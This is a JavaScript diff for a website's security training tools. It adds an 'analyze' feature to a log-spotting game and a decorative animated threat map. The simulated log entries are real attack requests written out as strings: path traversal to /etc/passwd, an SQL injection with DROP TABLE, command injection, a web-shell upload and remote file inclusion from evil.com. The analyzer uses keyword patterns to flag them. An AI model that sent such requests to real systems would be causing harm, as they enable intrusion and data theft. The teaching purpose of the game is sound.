@@ -691,6 +691,8 @@ document.addEventListener('DOMContentLoaded', () => {
     // Solo se ejecuta si estamos en la página del simulador
     if (logWindow) {
         const btnBlock = document.getElementById('btn-block');
+        const btnAnalyze = document.getElementById('btn-analyze');
+        const analysisBox = document.getElementById('analysis-box');
         const selectedInfo = document.getElementById('selected-info');
         const scoreDisplay = document.getElementById('score-display');
         const alertBox = document.getElementById('alert-box');
@@ -724,7 +726,10 @@ document.addEventListener('DOMContentLoaded', () => {
             "GET /download.php?file=../../../../etc/passwd HTTP/1.1",
             "GET /.git/config HTTP/1.1",
             "POST /api/upload (filename=shell.php) HTTP/1.1",
-            "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1"
+            "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1",
+            "GET /?cmd=cat%20/etc/passwd HTTP/1.1",
+            "GET /api/v1/user?id=1;DROP TABLE users HTTP/1.1",
+            "GET /index.php?page=http://evil.com/shell.txt HTTP/1.1"
         ];
 
         function getRandomIP() {
@@ -781,6 +786,8 @@ document.addEventListener('DOMContentLoaded', () => {
                     <div style="color:#aaa; margin-top:5px; font-size: 0.75rem;">PAYLOAD: ${request}</div>
                 `;
                 btnBlock.disabled = false;
+                if(btnAnalyze) btnAnalyze.disabled = false;
+                if(analysisBox) analysisBox.style.display = 'none';
             });
 
             logWindow.appendChild(logDiv);
@@ -789,6 +796,40 @@ document.addEventListener('DOMContentLoaded', () => {
             if (!isHovering) logWindow.scrollTop = logWindow.scrollHeight;
 
             setTimeout(generateLog, Math.random() * 1000 + 400);
+        }
+
+        if(btnAnalyze) {
+            btnAnalyze.addEventListener('click', () => {
+                if (!selectedLogData || isGameOver) return;
+                
+                let req = selectedLogData.req.toLowerCase();
+                let type = "UNKNOWN";
+                let severity = "LOW";
+                
+                if (req.includes("' or ") || req.includes("'--") || req.includes("drop table")) {
+                    type = "SQL Injection (SQLi)"; severity = "HIGH";
+                } else if (req.includes("<script>") || req.includes("alert(")) {
+                    type = "Cross-Site Scripting (XSS)"; severity = "MEDIUM";
+                } else if (req.includes("../") || req.includes("/etc/passwd")) {
+                    type = "Local File Inclusion (LFI) / Path Traversal"; severity = "CRITICAL";
+                } else if (req.includes("cmd=") || req.includes("shell.php")) {
+                    type = "Remote Code Execution (RCE)"; severity = "CRITICAL";
+                } else if (req.includes(".git")) {
+                    type = "Information Disclosure"; severity = "LOW";
+                } else if (req.includes("http://evil.com")) {
+                    type = "Remote File Inclusion (RFI)"; severity = "HIGH";
+                } else {
+                    type = "Legitimate Traffic"; severity = "NONE";
+                }
+                
+                analysisBox.style.display = 'block';
+                analysisBox.innerHTML = `
+                    <div style="color: #00ffff; margin-bottom: 5px;">[ SYSTEM ANALYSIS ]</div>
+                    <div><strong>THREAT TYPE:</strong> <span style="color: ${severity === 'NONE' ? '#00ff41' : '#ff2a2a'};">${type}</span></div>
+                    <div><strong>SEVERITY:</strong> <span style="color: ${severity === 'CRITICAL' ? '#ff00ff' : (severity === 'HIGH' ? '#ff2a2a' : (severity === 'MEDIUM' ? '#f0a000' : '#00ff41'))};">${severity}</span></div>
+                    <div style="margin-top: 5px; color: #aaa; font-style: italic;">> ${severity === 'NONE' ? 'Safe to ignore.' : 'Recommendation: Immediate blocking.'}</div>
+                `;
+            });
         }
 
         btnBlock.addEventListener('click', () => {
@@ -827,6 +868,7 @@ document.addEventListener('DOMContentLoaded', () => {
             
             selectedLogData = null;
             btnBlock.disabled = true;
+            if(btnAnalyze) btnAnalyze.disabled = true;
             selectedInfo.innerHTML = isEs ? '[ ANALIZANDO TRÁFICO... ]' : '[ ANALYZING TRAFFIC... ]';
             document.querySelectorAll('.log-line').forEach(el => el.classList.remove('selected'));
         });
@@ -2481,6 +2523,241 @@ document.addEventListener('DOMContentLoaded', () => {
                 e.target.value = "";
             }
         });
+    }
+
+    // ==========================================
+    // 8. LIVE THREAT MAP (tool-threat-map.php)
+    // ==========================================
+    const threatCanvas = document.getElementById('threat-canvas');
+    if (threatCanvas) {
+        const ctx = threatCanvas.getContext('2d');
+        
+        let width, height, centerX, centerY;
+        
+        function resize() {
+            width = threatCanvas.parentElement.clientWidth;
+            height = threatCanvas.parentElement.clientHeight;
+            threatCanvas.width = width;
+            threatCanvas.height = height;
+            centerX = width / 2;
+            centerY = height / 2;
+        }
+        window.addEventListener('resize', resize);
+        resize();
+
+        // --- DATA ---
+        let attacks = [];
+        let particles = [];
+        let totalAttacks = 0;
+        let criticalAttacks = 0;
+
+        const attackTypes = [
+            { name: "SQL Injection", severity: "high", color: "#ff2a2a" },
+            { name: "SSH Brute Force", severity: "medium", color: "#f0a000" },
+            { name: "DDoS Amplification", severity: "high", color: "#ff2a2a" },
+            { name: "Port Scan", severity: "low", color: "#00ff41" },
+            { name: "Cross-Site Scripting", severity: "medium", color: "#f0a000" },
+            { name: "RCE Exploit", severity: "high", color: "#ff2a2a" },
+            { name: "Malware Beacon", severity: "high", color: "#ff2a2a" }
+        ];
+
+        const targets = ["Honeypot-Alpha (NYC)", "Honeypot-Beta (FRA)", "Honeypot-Gamma (SGP)", "Core-Firewall", "Web-WAF-01"];
+
+        // --- DRAW RADAR ---
+        let radarAngle = 0;
+        function drawRadar() {
+            ctx.strokeStyle = "rgba(0, 255, 255, 0.15)";
+            ctx.lineWidth = 1;
+            
+            // Concentric circles
+            for(let r = 50; r < Math.max(width, height); r += 100) {
+                ctx.beginPath();
+                ctx.arc(centerX, centerY, r, 0, Math.PI * 2);
+                ctx.stroke();
+            }
+
+            // Crosshairs
+            ctx.beginPath();
+            ctx.moveTo(centerX, 0); ctx.lineTo(centerX, height);
+            ctx.moveTo(0, centerY); ctx.lineTo(width, centerY);
+            ctx.stroke();
+
+            // Sweeping radar line
+            radarAngle += 0.02;
+            ctx.save();
+            ctx.translate(centerX, centerY);
+            ctx.rotate(radarAngle);
+            
+            const gradient = ctx.createConicGradient(0, 0, 0);
+            gradient.addColorStop(0, "rgba(0, 255, 255, 0.3)");
+            gradient.addColorStop(0.1, "rgba(0, 255, 255, 0)");
+            gradient.addColorStop(1, "rgba(0, 255, 255, 0)");
+            
+            ctx.fillStyle = gradient;
+            ctx.beginPath();
+            ctx.moveTo(0, 0);
+            ctx.arc(0, 0, Math.max(width, height), 0, Math.PI * 2);
+            ctx.fill();
+            
+            ctx.strokeStyle = "rgba(0, 255, 255, 0.8)";
+            ctx.beginPath();
+            ctx.moveTo(0,0);
+            ctx.lineTo(Math.max(width, height), 0);
+            ctx.stroke();
+            
+            ctx.restore();
+            
+            // Central Node (Our Server)
+            ctx.beginPath();
+            ctx.arc(centerX, centerY, 8, 0, Math.PI * 2);
+            ctx.fillStyle = "#fff";
+            ctx.fill();
+            ctx.shadowBlur = 15;
+            ctx.shadowColor = "#00ffff";
+            ctx.strokeStyle = "#00ffff";
+            ctx.lineWidth = 3;
+            ctx.stroke();
+            ctx.shadowBlur = 0;
+        }
+
+        // --- ANIMATE ---
+        function animate() {
+            // Clear with fade effect for trails
+            ctx.fillStyle = "rgba(2, 5, 8, 0.2)";
+            ctx.fillRect(0, 0, width, height);
+
+            drawRadar();
+
+            // Update and draw attacks
+            for (let i = attacks.length - 1; i >= 0; i--) {
+                let a = attacks[i];
+                
+                // Draw line
+                ctx.beginPath();
+                ctx.moveTo(a.startX, a.startY);
+                ctx.lineTo(a.x, a.y);
+                ctx.strokeStyle = a.color;
+                ctx.lineWidth = 2;
+                ctx.stroke();
+                
+                // Draw head
+                ctx.beginPath();
+                ctx.arc(a.x, a.y, 3, 0, Math.PI * 2);
+                ctx.fillStyle = "#fff";
+                ctx.fill();
+                
+                // Move
+                a.progress += a.speed;
+                a.x = a.startX + (centerX - a.startX) * a.progress;
+                a.y = a.startY + (centerY - a.startY) * a.progress;
+                
+                // Collision detection
+                if (a.progress >= 1) {
+                    createExplosion(centerX, centerY, a.color);
+                    attacks.splice(i, 1);
+                }
+            }
+
+            // Update and draw particles (explosions)
+            for (let i = particles.length - 1; i >= 0; i--) {
+                let p = particles[i];
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                ctx.fillStyle = p.color;
+                ctx.globalAlpha = p.life;
+                ctx.fill();
+                ctx.globalAlpha = 1.0;
+                
+                p.x += p.vx;
+                p.y += p.vy;
+                p.life -= 0.05;
+                
+                if (p.life <= 0) particles.splice(i, 1);
+            }
+
+            requestAnimationFrame(animate);
+        }
+        
+        function createExplosion(x, y, color) {
+            for (let i = 0; i < 15; i++) {
+                particles.push({
+                    x: x, y: y,
+                    vx: (Math.random() - 0.5) * 10,
+                    vy: (Math.random() - 0.5) * 10,
+                    life: 1.0,
+                    size: Math.random() * 3 + 1,
+                    color: color
+                });
+            }
+        }
+
+        function randomIP() {
+            return Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
+        }
+        
+        function spawnAttack() {
+            // Random point on the edge of the screen
+            let startX, startY;
+            if (Math.random() > 0.5) {
+                startX = Math.random() > 0.5 ? 0 : width;
+                startY = Math.random() * height;
+            } else {
+                startX = Math.random() * width;
+                startY = Math.random() > 0.5 ? 0 : height;
+            }
+
+            const type = attackTypes[Math.floor(Math.random() * attackTypes.length)];
+            const target = targets[Math.floor(Math.random() * targets.length)];
+            const ip = randomIP();
+
+            attacks.push({
+                startX: startX, startY: startY,
+                x: startX, y: startY,
+                color: type.color,
+                speed: Math.random() * 0.01 + 0.005,
+                progress: 0
+            });
+            
+            addLog(ip, type, target);
+            
+            totalAttacks++;
+            document.getElementById('stat-attacks').innerText = totalAttacks;
+            if (type.severity === 'high') {
+                criticalAttacks++;
+                document.getElementById('stat-critical').innerText = criticalAttacks;
+            }
+
+            // Random next spawn (between 300ms and 2000ms)
+            setTimeout(spawnAttack, Math.random() * 1700 + 300);
+        }
+
+        function addLog(ip, type, target) {
+            const logsBody = document.getElementById('logs-body');
+            const now = new Date();
+            const time = now.getHours().toString().padStart(2, '0') + ":" + now.getMinutes().toString().padStart(2, '0') + ":" + now.getSeconds().toString().padStart(2, '0');
+            
+            // Remove 'INITIALIZING' message on first log
+            if (totalAttacks === 0) logsBody.innerHTML = '';
+            
+            const log = document.createElement('div');
+            log.className = `log-entry severity-${type.severity}`;
+            log.innerHTML = `
+                <div><span class="log-time">[${time}]</span> <span class="log-ip">${ip}</span></div>
+                <div class="log-type">${type.name}</div>
+                <div class="log-target">Target: ${target} - <strong style="color:${type.color}">BLOCKED</strong></div>
+            `;
+            
+            logsBody.prepend(log);
+            
+            // Keep max 30 logs in DOM
+            if (logsBody.children.length > 30) {
+                logsBody.removeChild(logsBody.lastChild);
+            }
+        }
+
+        // Start simulation
+        animate();
+        setTimeout(spawnAttack, 1000);
     }
 });
 })();
